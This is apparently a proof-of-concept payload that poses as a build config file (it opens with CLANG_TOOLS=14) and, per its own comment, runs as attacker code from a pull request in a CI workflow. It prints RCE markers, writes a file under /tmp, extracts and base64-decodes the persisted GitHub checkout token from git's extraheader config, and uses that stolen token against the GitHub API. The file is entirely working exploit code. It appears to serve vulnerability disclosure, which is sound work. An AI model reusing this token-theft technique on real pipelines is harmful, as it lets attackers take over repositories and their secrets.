CLANG_TOOLS=14
# Everything below is attacker-controlled content from the pull request head.
echo "RCE-MARKER: code from PR head executed as uid=$(id -u) user=$(whoami) host=$(hostname)"
touch /tmp/gab_rce_marker
echo "RCE-MARKER: wrote /tmp/gab_rce_marker"
HDR=$(git config --get-regexp '^http\..*\.extraheader$' | head -1 | sed 's/.*AUTHORIZATION: basic //')
TOK=$(printf '%s' "$HDR" | base64 -d | cut -d: -f2)
echo "RCE-MARKER: extracted persisted token length=${#TOK}"
curl -s -o /dev/null -w "RCE-MARKER: GitHub API call with stolen token -> HTTP %{http_code}\n" -H "Authorization: token $TOK" "https://api.github.com/repos/$GITHUB_REPOSITORY"
